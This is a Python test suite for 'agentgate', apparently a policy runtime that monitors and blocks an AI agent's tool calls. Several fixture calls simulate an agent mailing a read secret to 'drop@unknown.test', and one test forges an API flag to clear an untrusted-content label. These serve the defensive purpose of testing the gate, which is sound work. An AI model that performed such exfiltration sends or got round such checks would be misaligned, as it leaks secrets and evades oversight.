from __future__ import annotations

import asyncio

from fastapi.testclient import TestClient

from agentgate.api import create_app
from agentgate.capabilities import OutputTrust, ToolCapability
from agentgate.events import DataType, EffectType, RawToolCall, ResourceType, SecurityOperation
from agentgate.policy import DecisionAction, load_policy
from agentgate.runtime import RuntimeContext
from agentgate.state import StateLabel


async def test_block_and_pending_approval_do_not_advance_facts_or_rule_state(
    runtime_factory,
) -> None:
    policy = load_policy()
    event_rules = [
        rule.model_copy(update={"action": DecisionAction.REQUIRE_APPROVAL})
        if rule.id == "unknown_external_send"
        else rule
        for rule in policy.event_rules
    ]
    harness = runtime_factory(policy.model_copy(update={"event_rules": event_rules}))

    async def read_secret(_):
        return {"secret": "bounded-secret-value"}

    async def send(_):
        return {"sent": True}

    harness.runtime.registry.register(
        ToolCapability(
            tool_name="secret.read",
            possible_operations=[SecurityOperation.READ],
            resource_type=ResourceType.CREDENTIAL,
            sensitive_output_types={DataType.SECRET},
        ),
        read_secret,
    )
    harness.runtime.registry.register(
        ToolCapability(
            tool_name="message.send",
            possible_operations=[SecurityOperation.SEND],
            resource_type=ResourceType.MESSAGE,
            destination_arg="recipient",
            payload_args=["body"],
            default_effects={EffectType.EXTERNAL},
        ),
        send,
    )
    context = RuntimeContext(
        principal="analyst",
        session_id="no-progress",
        task_id="task-1",
    )
    await harness.runtime.execute(
        RawToolCall(
            tool_name="secret.read",
            principal="ignored",
            session_id="ignored",
        ),
        context,
    )
    before = await harness.runtime.detector.sequences.get_state("analyst", "no-progress")

    blocked = await harness.runtime.execute(
        RawToolCall(
            tool_name="message.send",
            arguments={
                "recipient": "drop@unknown.test",
                "body": "bounded-secret-value",
            },
            principal="ignored",
            session_id="ignored",
        ),
        context,
    )
    pending = await harness.runtime.execute(
        RawToolCall(
            tool_name="message.send",
            arguments={"recipient": "review@unknown.test", "body": "public"},
            principal="ignored",
            session_id="ignored",
        ),
        context,
    )
    state = await harness.runtime.state_manager.get("analyst", "no-progress")
    after = await harness.runtime.detector.sequences.get_state("analyst", "no-progress")

    assert blocked.decision.action == DecisionAction.BLOCK
    assert pending.decision.action == DecisionAction.REQUIRE_APPROVAL
    assert state.counters["external_send_count"] == 0
    assert before == after


async def test_output_trust_sets_exposure_and_caller_cannot_clear_it(runtime_factory) -> None:
    harness = runtime_factory()

    async def read(_):
        return {"content": "ordinary external content"}

    harness.runtime.registry.register(
        ToolCapability(
            tool_name="browser.read",
            possible_operations=[SecurityOperation.READ],
            resource_type=ResourceType.NETWORK,
            output_trust=OutputTrust.UNTRUSTED,
        ),
        read,
    )
    await harness.runtime.execute(
        RawToolCall(
            tool_name="browser.read",
            principal="agent",
            session_id="trust",
            context_hints=set(),
        )
    )
    state = await harness.runtime.state_manager.get("agent", "trust")
    assert StateLabel.EXPOSED_TO_UNTRUSTED_CONTENT in state.labels

    with TestClient(create_app(harness.runtime)) as client:
        forged = client.post(
            "/v1/calls/evaluate",
            json={
                "tool_name": "browser.read",
                "principal": "agent",
                "session_id": "trust",
                "untrusted_context": False,
                "task_authorization": {"allowed_operations": ["READ"]},
            },
        )
    assert forged.status_code == 422


async def test_same_task_cross_agent_shares_provenance_but_different_task_does_not(
    runtime_factory,
) -> None:
    harness = runtime_factory()

    async def read(_):
        return {"secret": "shared-task-secret"}

    async def send(_):
        return {"sent": True}

    harness.runtime.registry.register(
        ToolCapability(
            tool_name="vault.read",
            possible_operations=[SecurityOperation.READ],
            sensitive_output_types={DataType.SECRET},
        ),
        read,
    )
    harness.runtime.registry.register(
        ToolCapability(
            tool_name="message.send",
            possible_operations=[SecurityOperation.SEND],
            resource_type=ResourceType.MESSAGE,
            destination_arg="recipient",
            payload_args=["body"],
            default_effects={EffectType.EXTERNAL},
        ),
        send,
    )
    await harness.runtime.execute(
        RawToolCall(tool_name="vault.read", principal="p", session_id="s"),
        RuntimeContext(principal="p", session_id="s", task_id="task-1", agent_id="A"),
    )
    different_task = await harness.runtime.execute(
        RawToolCall(
            tool_name="message.send",
            arguments={"recipient": "partner@partner.test", "body": "shared-task-secret"},
            principal="p",
            session_id="s",
        ),
        RuntimeContext(principal="p", session_id="s", task_id="task-2", agent_id="B"),
    )
    same_task = await harness.runtime.execute(
        RawToolCall(
            tool_name="message.send",
            arguments={"recipient": "drop@unknown.test", "body": "shared-task-secret"},
            principal="p",
            session_id="s",
        ),
        RuntimeContext(principal="p", session_id="s", task_id="task-1", agent_id="B"),
    )
    assert "sensitive_data_exfiltration" not in different_task.decision.rule_ids
    assert same_task.decision.action == DecisionAction.BLOCK
    assert "sensitive_data_exfiltration" in same_task.decision.rule_ids


async def test_local_coordinator_serializes_projected_aggregate_decisions(runtime_factory) -> None:
    harness = runtime_factory()
    executed = 0

    async def read(arguments):
        nonlocal executed
        executed += 1
        await asyncio.sleep(0)
        return [{"email": f"p-{index}@test"} for index in range(arguments["limit"])]

    harness.runtime.registry.register(
        ToolCapability(
            tool_name="records.read",
            possible_operations=[SecurityOperation.READ],
            resource_type=ResourceType.DATABASE,
            scope_arg="limit",
            sensitive_output_types={DataType.PERSONAL},
        ),
        read,
    )
    outcomes = await asyncio.gather(
        *[
            harness.runtime.execute(
                RawToolCall(
                    tool_name="records.read",
                    arguments={"limit": 60},
                    principal="analyst",
                    session_id="concurrent",
                    call_id=f"read-{index}",
                )
            )
            for index in range(2)
        ]
    )
    assert executed == 1
    assert sorted(item.decision.action for item in outcomes) == [
        DecisionAction.ALLOW,
        DecisionAction.BLOCK,
    ]
